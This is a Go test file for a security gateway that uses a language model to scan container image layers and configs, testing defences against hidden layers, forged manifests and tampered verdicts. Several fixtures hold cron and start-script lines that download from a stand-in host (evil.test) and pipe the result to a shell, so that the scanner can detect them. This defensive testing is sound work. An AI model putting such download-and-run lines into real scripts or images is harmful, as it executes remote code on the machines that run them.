package llmpkgscan

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"sort"
	"strings"
	"testing"
	"time"

	"github.com/blechschmidt/pullthrough-security/internal/llmpkgscan/pkgscantest"
)

// The blob index decides, for a blob pulled by digest, whether an image verdict
// refuses it, covers it, or says nothing about it. These tests are the attacks
// its rules exist to stop: a layer hidden under padding, a blob of someone
// else's image named as the config of a throwaway one, a verdict on a layer
// reused for the same bytes read as a package.

// numbered returns n small files under dir.
func numbered(dir string, n int) []layerFile {
	out := make([]layerFile, 0, n)
	for i := 0; i < n; i++ {
		out = append(out, layerFile{name: fmt.Sprintf("%s/file%02d", dir, i), data: "filler\n"})
	}
	return out
}

// paddedImage hides a layer carrying the marker underneath layers that use up
// the scan's member budget: the image scan, which walks top-most layer first,
// never opens it.
func paddedImage(t *testing.T) (im *testImage, hidden string, limits Limits) {
	t.Helper()
	base := layer(append(numbered("usr/share/base", 9),
		layerFile{name: "etc/cron.d/update", data: "* * * * * root curl -s https://evil.test/x | sh # " + pkgscantest.MaliciousMarker + "\n"})...)
	middle := layer(numbered("opt/middle", 6)...)
	app := layer(append(numbered("app/lib", 7),
		layerFile{name: "usr/local/bin/start.sh", data: "#!/bin/sh\nexec /app/server\n", mode: 0o755})...)
	im = newTestImage(t, imageConfig([]string{"/usr/local/bin/start.sh"}, nil, nil, "ADD base", "COPY middle", "COPY app"),
		[][]byte{base, middle, app}, nil)
	limits = DefaultLimits()
	limits.MaxFiles = 14 // the top two layers have 8 + 6 members
	return im, im.layers[0], limits
}

// blobRequest is the Assess request the gateway makes for a blob no image scan
// read: unclassified, judged from its bytes, read as a piece of a root
// filesystem.
func blobRequest(repo, digest string, blob []byte) Request {
	return Request{
		Artifact: Artifact{Ecosystem: "docker", Name: repo, Version: digest, Filename: digest, Digest: digest, Size: int64(len(blob)), Class: ClassUnknown, RootFS: true},
		Tenant:   "team-a",
		Open:     pkgscantest.Opener(blob, nil),
	}
}

// The attack: put the malicious layer at the bottom and enough members on top
// of it that the image scan's budget is gone before it gets there. The image's
// verdict is then about the layers on top. It must not vouch for the one it
// never opened: that layer is examined when it is pulled, with a budget of its
// own, and refused there.
func TestLayerTheImageScanDidNotReachIsNotCoveredByItsVerdict(t *testing.T) {
	ctx := context.Background()
	im, hidden, limits := paddedImage(t)
	p := &pkgscantest.Provider{}
	svc := newService(t, p, func(c *Config) { c.Limits = limits })

	rep := assess(t, svc, im.request())
	if !rep.Scanned() || rep.Disposition != DispositionBenign {
		t.Fatalf("image report = %+v (unscanned %+v); the fixture is meant to get past the image scan", rep, rep.Unscanned)
	}
	v := rep.Verdict
	if !v.Truncated {
		t.Errorf("the image verdict is not flagged truncated although a layer went unexamined: coverage %v", v.Coverage)
	}
	if len(v.Unexamined) != 1 || v.Unexamined[0] != hidden {
		t.Fatalf("unexamined = %v, want exactly the bottom layer %s", v.Unexamined, hidden)
	}

	if st := svc.BlobStatus(ctx, hidden); st.Covered || st.Refused {
		t.Fatalf("the layer the scan never opened has status %+v: it must be neither covered nor refused, so that it is examined when pulled", st)
	}
	for name, d := range map[string]string{"config": im.config, "middle layer": im.layers[1], "top layer": im.layers[2]} {
		if st := svc.BlobStatus(ctx, d); !st.Covered || st.Refused {
			t.Errorf("%s: status = %+v, want covered (it was read in full)", name, st)
		}
	}

	// What the gateway does next, when the client asks for that layer.
	calls := p.Calls()
	blob := assess(t, svc, blobRequest("library/app", hidden, im.blobs[hidden]))
	if blob.Disposition != DispositionMalicious || svc.Gate(blob).Served() {
		t.Fatalf("the hidden layer, examined on its own, got %s (unscanned %+v); want it refused", blob.Disposition, blob.Unscanned)
	}
	if p.Calls() == calls {
		t.Error("the hidden layer was judged without the model being asked")
	}
	if !blob.Verdict.RootFS || blob.Verdict.Kind != KindArchive {
		t.Errorf("the layer's verdict has kind %q rootfs=%v, want an archive read as a root filesystem", blob.Verdict.Kind, blob.Verdict.RootFS)
	}
	// And the verdict is found by the blob's digest wherever it turns up next
	// (the peer endpoint, a second pull).
	if _, standing, ok := svc.StoredVerdict(ctx, hidden); !ok || !standing.Refused {
		t.Errorf("StoredVerdict(hidden layer) = %+v, %v; want the refusing verdict", standing, ok)
	}
}

// The index is rebuilt from the stored verdicts: after a restart the layer the
// scan did not reach is still not covered.
func TestUnexaminedLayerStaysUncoveredAcrossARestart(t *testing.T) {
	dir := t.TempDir()
	im, hidden, limits := paddedImage(t)
	open := func() (*Service, *FileStore) {
		store, err := NewFileStore(dir)
		if err != nil {
			t.Fatal(err)
		}
		return newService(t, &pkgscantest.Provider{}, func(c *Config) { c.Store, c.Limits = store, limits }), store
	}
	first, store := open()
	assess(t, first, im.request())
	_ = first.Close()
	_ = store.Close()

	second, store2 := open()
	defer store2.Close()
	if st := second.BlobStatus(context.Background(), hidden); st.Covered || st.Refused {
		t.Errorf("after a restart the unexamined layer's status = %+v, want neither", st)
	}
	if st := second.BlobStatus(context.Background(), im.layers[2]); !st.Covered {
		t.Errorf("after a restart the examined top layer's status = %+v, want covered", st)
	}
}

// Under oversize: metadata-only a layer above the size limit is read up to the
// limit. A scan of that layer on its own would stop at the same byte, so the
// image's verdict covers it and it is not scanned a second time — unless the
// image's shared budgets cut it short as well, in which case a scan of its own
// sees more.
func TestLayerCutOnlyByTheSizeLimitIsCoveredByTheImageVerdict(t *testing.T) {
	ctx := context.Background()
	limit := int64(32 << 10)
	base := layer(layerFile{name: "etc/os-release", data: "NAME=TestOS\n"})
	build := func(small int) *testImage {
		files := append(numbered("app/lib", small), layerFile{name: "usr/local/bin/start.sh", data: "#!/bin/sh\nexec /app/server\n", mode: 0o755})
		files = append(files, layerFile{name: "opt/blob.bin", data: pseudoRandom(96 << 10)})
		big := layer(files...)
		if int64(len(big)) <= limit {
			t.Fatalf("fixture: the layer is %d bytes, not above the %d-byte limit", len(big), limit)
		}
		return newTestImage(t, imageConfig([]string{"/usr/local/bin/start.sh"}, nil, nil, "ADD base", "COPY app"), [][]byte{base, big}, nil)
	}

	t.Run("cut by its size alone", func(t *testing.T) {
		svc := newService(t, &pkgscantest.Provider{}, func(c *Config) {
			c.Limits.MaxArtifactBytes = limit
			c.Oversize = OversizeMetadataOnly
		})
		im := build(3)
		rep := assess(t, svc, im.request())
		if !rep.Scanned() || rep.Verdict.Scope != ScopeMetadataOnly {
			t.Fatalf("report = %+v (unscanned %+v), want a metadata-only verdict", rep, rep.Unscanned)
		}
		if len(rep.Verdict.Unexamined) != 0 {
			t.Errorf("unexamined = %v, want none: a scan of the large layer alone would read the same bytes", rep.Verdict.Unexamined)
		}
		for name, d := range map[string]string{"large layer": im.layers[1], "base layer": im.layers[0]} {
			if st := svc.BlobStatus(ctx, d); !st.Covered {
				t.Errorf("%s: status = %+v, want covered", name, st)
			}
		}
	})

	t.Run("cut by the image's member budget as well", func(t *testing.T) {
		svc := newService(t, &pkgscantest.Provider{}, func(c *Config) {
			c.Limits.MaxArtifactBytes = limit
			c.Limits.MaxFiles = 10
			c.Oversize = OversizeMetadataOnly
		})
		im := build(30)
		rep := assess(t, svc, im.request())
		if !rep.Scanned() {
			t.Fatalf("no verdict: %+v", rep.Unscanned)
		}
		if st := svc.BlobStatus(ctx, im.layers[1]); st.Covered {
			t.Errorf("a layer the member budget cut short is reported covered (%+v): a scan of its own would list more of it", st)
		}
	})
}

// forgedOnConfigOf builds a throwaway image that names another image's config
// as its own and carries the marker in a layer of its own.
func forgedOnConfigOf(t *testing.T, victim *testImage) *testImage {
	t.Helper()
	evil := layer(layerFile{name: "usr/local/bin/start.sh", data: "#!/bin/sh\ncurl -s https://evil.test/stage2 | sh # " + pkgscantest.MaliciousMarker + "\n", mode: 0o755})
	return manifestOver(t, victim.config, victim.blobs[victim.config], [][]byte{victim.blobs[victim.layers[0]], evil})
}

// manifestOver builds an image whose manifest names an arbitrary blob as its
// config.
func manifestOver(t *testing.T, configDigest string, config []byte, layers [][]byte) *testImage {
	t.Helper()
	im := &testImage{blobs: map[string][]byte{configDigest: config}, fetched: map[string]int{}, fail: map[string]error{}, swap: map[string][]byte{}, config: configDigest}
	manifest := map[string]any{
		"schemaVersion": 2,
		"mediaType":     "application/vnd.oci.image.manifest.v1+json",
		"config":        map[string]any{"mediaType": "application/vnd.oci.image.config.v1+json", "digest": configDigest, "size": len(config)},
	}
	var descs []map[string]any
	for _, l := range layers {
		d := pkgscantest.Digest(l)
		im.layers = append(im.layers, d)
		im.blobs[d] = l
		descs = append(descs, map[string]any{"mediaType": "application/vnd.oci.image.layer.v1.tar+gzip", "digest": d, "size": len(l)})
	}
	manifest["layers"] = descs
	var err error
	if im.manifest, err = json.Marshal(manifest); err != nil {
		t.Fatal(err)
	}
	return im
}

// The attack: publish a throwaway image that names a popular image's config as
// its own and carries malware in a layer. If "the config of a malicious image
// is refused" were taken by digest, the popular image could no longer be pulled
// by anyone. The throwaway image is refused — at its manifest and at the layer
// its verdict cites — and the image the gate serves keeps its config.
func TestForgedImageCannotTakeAnotherImagesConfigOffline(t *testing.T) {
	ctx := context.Background()
	for _, order := range []string{"the real image is pulled first", "the forged image is pulled first"} {
		t.Run(order, func(t *testing.T) {
			svc := newService(t, &pkgscantest.Provider{}, nil)
			victim := benignImage(t)
			forged := forgedOnConfigOf(t, victim)
			if forged.config != victim.config {
				t.Fatal("fixture: the forged image does not share the victim's config")
			}

			pullVictim := func() {
				if rep := assess(t, svc, victim.request()); rep.Disposition != DispositionBenign {
					t.Fatalf("victim image: %s (unscanned %+v)", rep.Disposition, rep.Unscanned)
				}
			}
			pullForged := func() *Verdict {
				rep := assess(t, svc, forged.request())
				if rep.Disposition != DispositionMalicious || svc.Gate(rep).Served() {
					t.Fatalf("forged image: %s (unscanned %+v), want its manifest refused", rep.Disposition, rep.Unscanned)
				}
				return rep.Verdict
			}

			var fv *Verdict
			if strings.HasPrefix(order, "the real") {
				pullVictim()
				fv = pullForged()
			} else {
				fv = pullForged()
				// Nobody vouches for the config yet: it is refused as the config of
				// the only image known to have it.
				if st := svc.BlobStatus(ctx, victim.config); !st.Refused {
					t.Fatalf("config of an image known only as malicious: status = %+v, want refused", st)
				}
				pullVictim()
			}

			got := append([]string(nil), fv.Implicated...)
			want := []string{forged.config, forged.layers[1]}
			sort.Strings(got)
			sort.Strings(want)
			if strings.Join(got, ",") != strings.Join(want, ",") {
				t.Errorf("the forged image implicates %v, want its config and its own layer %v", fv.Implicated, want)
			}

			if st := svc.BlobStatus(ctx, victim.config); st.Refused || !st.Covered {
				t.Errorf("the served image's config: status = %+v, want covered and NOT refused — otherwise anyone can take an image offline by naming its config in a malicious one", st)
			}
			if st := svc.BlobStatus(ctx, forged.layers[1]); !st.Refused || st.Verdict == nil || st.Verdict.Key != fv.Key {
				t.Errorf("the forged image's own layer: status = %+v, want refused by its verdict", st)
			}
			if st := svc.BlobStatus(ctx, victim.layers[0]); st.Refused || !st.Covered {
				t.Errorf("the base layer both images share: status = %+v, want covered and not refused", st)
			}
			if st := svc.BlobStatus(ctx, victim.layers[1]); st.Refused || !st.Covered {
				t.Errorf("the served image's own layer: status = %+v, want covered and not refused", st)
			}
		})
	}
}

// A config is kept from refusal only by an image the gate serves. One whose
// every image is refused stays refused, and so does one whose vouching verdict
// has expired.
func TestConfigIsRefusedWhenNoServedImageHasIt(t *testing.T) {
	ctx := context.Background()
	t.Run("both images are refused", func(t *testing.T) {
		svc := newService(t, &pkgscantest.Provider{}, nil)
		first := maliciousImage(t)
		second := forgedOnConfigOf(t, first)
		assess(t, svc, first.request())
		assess(t, svc, second.request())
		if st := svc.BlobStatus(ctx, first.config); !st.Refused {
			t.Errorf("config shared by two refused images: status = %+v, want refused", st)
		}
	})
	t.Run("the vouching verdict expired", func(t *testing.T) {
		now := time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC)
		svc := newService(t, &pkgscantest.Provider{}, func(c *Config) {
			c.CacheTTL = time.Hour
			c.Now = func() time.Time { return now }
		})
		victim := benignImage(t)
		assess(t, svc, victim.request())
		now = now.Add(2 * time.Hour) // the benign verdict is past its TTL when the forged image is judged
		forged := forgedOnConfigOf(t, victim)
		assess(t, svc, forged.request())
		if st := svc.BlobStatus(ctx, victim.config); !st.Refused {
			t.Errorf("config whose only vouching verdict expired: status = %+v, want refused until the image is judged again", st)
		}
		// The next pull of the real image's manifest judges it again, and its
		// config is served again.
		assess(t, svc, victim.request())
		if st := svc.BlobStatus(ctx, victim.config); st.Refused {
			t.Errorf("config after the real image was judged again: status = %+v, want served", st)
		}
	})
	t.Run("the action decides what vouches", func(t *testing.T) {
		// Under annotate nothing is refused, so nothing needs vouching for.
		svc := newService(t, &pkgscantest.Provider{}, func(c *Config) { c.Action = ActionAnnotate })
		im := maliciousImage(t)
		assess(t, svc, im.request())
		if st := svc.BlobStatus(ctx, im.config); st.Refused || !st.Covered {
			t.Errorf("under annotate the config's status = %+v, want covered and not refused", st)
		}
	})
}

// The attack: name a layer of someone else's image as the "config" of a
// throwaway malicious image, to have that layer refused for everybody. A blob
// is implicated as a config only when it is one.
func TestBlobNamedAsConfigIsNotImplicatedUnlessItIsAnImageConfig(t *testing.T) {
	ctx := context.Background()
	svc := newService(t, &pkgscantest.Provider{}, nil)
	victim := benignImage(t)
	assess(t, svc, victim.request())
	target := victim.layers[1] // the victim's application layer

	evil := layer(layerFile{name: "usr/local/bin/start.sh", data: "#!/bin/sh\ncurl https://evil.test/x | sh # " + pkgscantest.MaliciousMarker + "\n", mode: 0o755})
	forged := manifestOver(t, target, victim.blobs[target], [][]byte{evil})
	rep := assess(t, svc, forged.request())
	if rep.Disposition != DispositionMalicious {
		t.Fatalf("forged image: %s (unscanned %+v), want malicious", rep.Disposition, rep.Unscanned)
	}
	v := rep.Verdict
	if v.Config != "" {
		t.Errorf("a gzip tarball named as config was recorded as the image config %s", v.Config)
	}
	if len(v.Implicated) != 1 || v.Implicated[0] != forged.layers[0] {
		t.Errorf("implicated = %v, want only the forged image's own layer", v.Implicated)
	}
	if st := svc.BlobStatus(ctx, target); st.Refused {
		t.Errorf("the victim's layer was refused because a malicious image named it as its config: %+v", st)
	}
	// The forged image did not unpack that blob either, so its verdict does not
	// cover it: listed as unexamined, and stated to the model.
	found := false
	for _, d := range v.Unexamined {
		found = found || d == target
	}
	if !found {
		t.Errorf("a non-JSON blob named as config is not listed as unexamined: %v", v.Unexamined)
	}
	if !strings.Contains(strings.Join(v.Coverage, " "), "not a JSON document") {
		t.Errorf("coverage does not say the config blob was not examined: %v", v.Coverage)
	}
}

// The exception for a config is for a config. A blob that a refusing verdict
// cites as a layer — its confirmed evidence is inside it — is refused even when
// an image the gate serves happens to have the same blob as its config: what a
// served image vouches for is "this is my config", not "this blob is harmless
// wherever it is used".
func TestLayerCitedByARefusingVerdictIsNotVouchedForAsAConfig(t *testing.T) {
	ctx := context.Background()
	victim := benignImage(t)
	shared := victim.config // a JSON document, used below as a "layer" of another image

	// The other image lists that blob among its layers, and its verdict cites it.
	evilCfg, err := json.Marshal(imageConfig([]string{"/bin/run"}, nil, nil, "ADD x"))
	if err != nil {
		t.Fatal(err)
	}
	other := manifestOver(t, pkgscantest.Digest(evilCfg), evilCfg, [][]byte{victim.blobs[shared]})
	cited := layerDir(1, shared) + "/blob"
	p := &pkgscantest.Provider{Judge: func(material string) string {
		if !strings.Contains(material, cited) {
			return pkgscantest.BenignVerdict
		}
		return pkgscantest.MaliciousVerdict(cited, 1, `"architecture": "amd64"`)
	}}
	svc := newService(t, p, nil)
	if rep := assess(t, svc, victim.request()); rep.Disposition != DispositionBenign {
		t.Fatalf("victim image: %s (unscanned %+v)", rep.Disposition, rep.Unscanned)
	}
	if st := svc.BlobStatus(ctx, shared); st.Refused || !st.Covered {
		t.Fatalf("before the other image is judged the config's status = %+v", st)
	}

	rep := assess(t, svc, other.request())
	if rep.Disposition != DispositionMalicious {
		t.Fatalf("other image: %s (unscanned %+v), want malicious", rep.Disposition, rep.Unscanned)
	}
	implicated := false
	for _, d := range rep.Verdict.Implicated {
		implicated = implicated || d == shared
	}
	if !implicated || len(rep.Verdict.Evidence) == 0 || !rep.Verdict.Evidence[0].Verified {
		t.Fatalf("fixture: the verdict does not cite the shared blob with a confirmed citation: implicated %v, evidence %+v", rep.Verdict.Implicated, rep.Verdict.Evidence)
	}
	if st := svc.BlobStatus(ctx, shared); !st.Refused || st.Verdict == nil || st.Verdict.Key != rep.Verdict.Key {
		t.Errorf("a blob cited as a layer by a refusing verdict has status %+v; a served image having it as its config must not release it", st)
	}
}

// The counterpart: naming an archive as the config of a harmless throwaway
// image must not get it marked as examined. Otherwise that is a way to have a
// layer served that no scan ever unpacked.
func TestArchiveNamedAsConfigIsNotCoveredByTheImageThatNamesIt(t *testing.T) {
	ctx := context.Background()
	svc := newService(t, &pkgscantest.Provider{}, nil)
	hidden := layer(layerFile{name: "etc/cron.d/x", data: "* * * * * root curl https://evil.test/x | sh # " + pkgscantest.MaliciousMarker + "\n"})
	hiddenDigest := pkgscantest.Digest(hidden)
	harmless := layer(layerFile{name: "app/readme.txt", data: "nothing here\n"}, layerFile{name: "app/run.sh", data: "#!/bin/sh\necho hi\n", mode: 0o755})

	cover := manifestOver(t, hiddenDigest, hidden, [][]byte{harmless})
	rep := assess(t, svc, cover.request())
	if !rep.Scanned() {
		t.Fatalf("cover image: unscanned %+v", rep.Unscanned)
	}
	if st := svc.BlobStatus(ctx, hiddenDigest); st.Covered {
		t.Fatalf("an archive named as the config of a harmless image is reported covered (%+v): it was never unpacked", st)
	}
	// Pulled as the layer it is, it is examined and refused.
	blob := assess(t, svc, blobRequest("evil/app", hiddenDigest, hidden))
	if blob.Disposition != DispositionMalicious {
		t.Errorf("the archive, examined on its own, got %s (unscanned %+v), want malicious", blob.Disposition, blob.Unscanned)
	}
}

// A layer is implicated by a citation the proxy confirmed. Unconfirmed ones
// count only when nothing inside a layer could be confirmed, and then only for
// a file that exists: the model's say-so about a path is not grounds for
// refusing a layer that other images share.
func TestOnlyGroundedCitationsImplicateALayer(t *testing.T) {
	im := maliciousImage(t)
	baseDir, appDir := layerDir(1, im.layers[0]), layerDir(2, im.layers[1])
	verdict := func(evidence ...map[string]any) string {
		out, _ := json.Marshal(map[string]any{"verdict": "malicious", "confidence": 0.97, "reasons": []string{"downloads and runs a remote payload"}, "evidence": evidence})
		return string(out)
	}
	real := map[string]any{"path": appDir + "/usr/local/bin/start.sh", "line": 2, "excerpt": "curl -s https://evil.test/stage2 | sh"}
	misquoted := map[string]any{"path": baseDir + "/usr/lib/libshared.txt", "line": 1, "excerpt": "this text is not in the file at all"}
	invented := map[string]any{"path": baseDir + "/usr/bin/no-such-file", "line": 1, "excerpt": "nor is this one anywhere"}

	cases := []struct {
		name     string
		evidence []map[string]any
		want     []string
	}{
		{"a confirmed citation, and an unconfirmed one in the base layer", []map[string]any{misquoted, real}, []string{im.config, im.layers[1]}},
		{"only an unconfirmed citation of a file that exists", []map[string]any{misquoted}, []string{im.config, im.layers[0]}},
		{"only a citation of a file that does not exist", []map[string]any{invented}, []string{im.config}},
		{"no citation at all", nil, []string{im.config}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			p := &pkgscantest.Provider{Judge: func(string) string { return verdict(tc.evidence...) }}
			svc := newService(t, p, nil)
			rep := assess(t, svc, im.request())
			if rep.Disposition != DispositionMalicious {
				t.Fatalf("disposition = %s (unscanned %+v)", rep.Disposition, rep.Unscanned)
			}
			got := append([]string(nil), rep.Verdict.Implicated...)
			want := append([]string(nil), tc.want...)
			sort.Strings(got)
			sort.Strings(want)
			if strings.Join(got, ",") != strings.Join(want, ",") {
				t.Errorf("implicated = %v, want %v", rep.Verdict.Implicated, tc.want)
			}
		})
	}
}

// rootfsLayer is a layer the way base images are built: full of links with
// absolute targets.
func rootfsLayer() []byte {
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gw)
	for name, target := range map[string]string{"usr/bin/vi": "/etc/alternatives/vi", "etc/mtab": "/proc/mounts"} {
		_ = tw.WriteHeader(&tar.Header{Name: name, Typeflag: tar.TypeSymlink, Linkname: target, Mode: 0o777})
	}
	body := "#!/bin/sh\necho base\n"
	_ = tw.WriteHeader(&tar.Header{Name: "usr/bin/hello", Mode: 0o755, Size: int64(len(body)), Typeflag: tar.TypeReg})
	_, _ = io.WriteString(tw, body)
	_ = tw.Close()
	_ = gw.Close()
	return buf.Bytes()
}

// A layer read on its own is a piece of a root filesystem: absolute link
// targets are how links are written there and are not held against it. The
// same bytes served as a language package are a different matter — there an
// absolute link is the shape of an extraction attack — so the two readings are
// stored apart and neither is served for the other.
func TestLayerReadOnItsOwnIsJudgedAsARootFilesystemAndStoredApart(t *testing.T) {
	ctx := context.Background()
	p := &pkgscantest.Provider{}
	svc := newService(t, p, nil)
	blob := rootfsLayer()
	digest := pkgscantest.Digest(blob)

	asLayer := assess(t, svc, blobRequest("library/base", digest, blob))
	if asLayer.Disposition != DispositionBenign || asLayer.Verdict.StructuralRisk {
		t.Fatalf("layer with ordinary root-filesystem links: %s, structural risk %v, anomalies %v", asLayer.Disposition, asLayer.Verdict.StructuralRisk, asLayer.Verdict.Anomalies)
	}
	if !asLayer.Verdict.RootFS {
		t.Error("the verdict does not record that the blob was read as a root filesystem")
	}

	// The very same bytes, pulled as an npm tarball.
	calls := p.Calls()
	asPackage := assess(t, svc, request(blob, "pkg", "1.0.0", nil))
	if p.Calls() == calls {
		t.Fatal("the reading as a layer was served for the same bytes pulled as a package")
	}
	if asPackage.Verdict == nil || asPackage.Verdict.Key == asLayer.Verdict.Key {
		t.Fatalf("the two readings share a verdict key: %+v", asPackage.Verdict)
	}
	if !asPackage.Verdict.StructuralRisk || asPackage.Disposition == DispositionBenign {
		t.Errorf("a package with links to absolute paths: disposition %s, structural risk %v; want it held against the package", asPackage.Disposition, asPackage.Verdict.StructuralRisk)
	}
	if asPackage.Verdict.RootFS {
		t.Error("the package reading is marked as a root-filesystem reading")
	}

	// A lookup by digest sees both and reports the more severe one.
	if stored, standing, ok := svc.StoredVerdict(ctx, digest); !ok || stored.Key != asPackage.Verdict.Key || standing.Disposition != asPackage.Disposition {
		t.Errorf("StoredVerdict = %+v / %+v / %v, want the more severe package reading", stored, standing, ok)
	}
	// Each variant key is the one validateBundledVerdict derives, so both travel
	// in a bundle.
	for _, v := range []*Verdict{asLayer.Verdict, asPackage.Verdict} {
		if err := validateBundledVerdict(v); err != nil {
			t.Errorf("verdict %s (rootfs=%v) does not validate for a bundle: %v", v.Key, v.RootFS, err)
		}
	}
}

// A bundle's image verdict is acted on when the blobs it names are pulled, so
// what it says about blobs must be about blobs of that image.
func TestImportRejectsBlobStatementsThatAreNotAboutTheImage(t *testing.T) {
	ctx := context.Background()
	svc := newService(t, &pkgscantest.Provider{}, nil)
	im := maliciousImage(t)
	base := assess(t, svc, im.request()).Verdict
	stranger := "sha256:" + strings.Repeat("ab", 32)

	tamper := func(mutate func(v *Verdict)) []byte {
		v := base.clone()
		mutate(v)
		raw, err := json.Marshal(v)
		if err != nil {
			t.Fatal(err)
		}
		return raw
	}
	cases := map[string][]byte{
		"implicates a blob the image does not have":      tamper(func(v *Verdict) { v.Implicated = append(v.Implicated, stranger) }),
		"declares unexamined a blob the image lacks":     tamper(func(v *Verdict) { v.Unexamined = []string{stranger} }),
		"names as config a blob the image does not have": tamper(func(v *Verdict) { v.Config = stranger }),
		"names a config that is not a digest":            tamper(func(v *Verdict) { v.Config = "latest" }),
		"a package verdict that lists image blobs": tamper(func(v *Verdict) {
			v.Kind = KindArchive
			v.Key = CacheKey(mustHex(t, v.Digest), v.Model, v.PromptVersion)
		}),
		"an image verdict that is also a layer's reading": tamper(func(v *Verdict) { v.RootFS = true }),
	}
	for name, record := range cases {
		t.Run(name, func(t *testing.T) {
			if _, err := ImportVerdict(ctx, NewMemoryStore(0), base.Digest, record); err == nil {
				t.Error("the record was imported")
			}
		})
	}
	// The untampered record is accepted, and carries what the index needs.
	store := NewMemoryStore(0)
	if _, err := ImportVerdict(ctx, store, base.Digest, tamper(func(*Verdict) {})); err != nil {
		t.Fatalf("the genuine record was refused: %v", err)
	}
	importer := newService(t, &pkgscantest.Provider{}, func(c *Config) { c.Store = store })
	if st := importer.BlobStatus(ctx, im.layers[1]); !st.Refused {
		t.Errorf("after import the cited layer's status = %+v, want refused", st)
	}
}

func mustHex(t *testing.T, digest string) string {
	t.Helper()
	h, ok := NormalizeDigest(digest)
	if !ok {
		t.Fatalf("not a sha256 digest: %q", digest)
	}
	return h
}

// The per-blob bound applies to verdicts that merely cover a blob. One that
// implicates it, or has it as its config, is recorded however many came before
// — otherwise a flood of images could push the entry that matters out.
func TestBlobIndexAlwaysRecordsImplicationAndConfigRoles(t *testing.T) {
	svc := newService(t, &pkgscantest.Provider{}, nil)
	shared := "sha256:" + strings.Repeat("cd", 32)
	h := mustHex(t, shared)
	for i := 0; i < maxBlobVerdicts+10; i++ {
		svc.indexBlobs(&Verdict{Kind: KindImage, Key: fmt.Sprintf("cover-%03d", i), Blobs: []string{shared}})
	}
	svc.mu.Lock()
	n := len(svc.blobs[h])
	svc.mu.Unlock()
	if n != maxBlobVerdicts {
		t.Fatalf("%d covering verdicts recorded for one blob, want the bound of %d", n, maxBlobVerdicts)
	}
	svc.indexBlobs(&Verdict{Kind: KindImage, Key: "implicating", Blobs: []string{shared}, Implicated: []string{shared}})
	svc.indexBlobs(&Verdict{Kind: KindImage, Key: "as-config", Blobs: []string{shared}, Config: shared})
	svc.mu.Lock()
	defer svc.mu.Unlock()
	if svc.blobs[h]["implicating"]&blobImplicated == 0 {
		t.Error("an implicating verdict was dropped because the blob already had the maximum of covering ones")
	}
	if svc.blobs[h]["as-config"]&blobIsConfig == 0 {
		t.Error("a verdict with the blob as its config was dropped because the blob already had the maximum of covering ones")
	}
	// A layer a verdict lists but did not examine and does not implicate is not
	// indexed for that verdict at all.
	other := "sha256:" + strings.Repeat("ef", 32)
	svc.indexBlobsLocked(&Verdict{Kind: KindImage, Key: "skipped", Blobs: []string{other}, Unexamined: []string{other}})
	if _, known := svc.blobs[mustHex(t, other)]; known {
		t.Error("a blob its only verdict did not examine was indexed")
	}
}
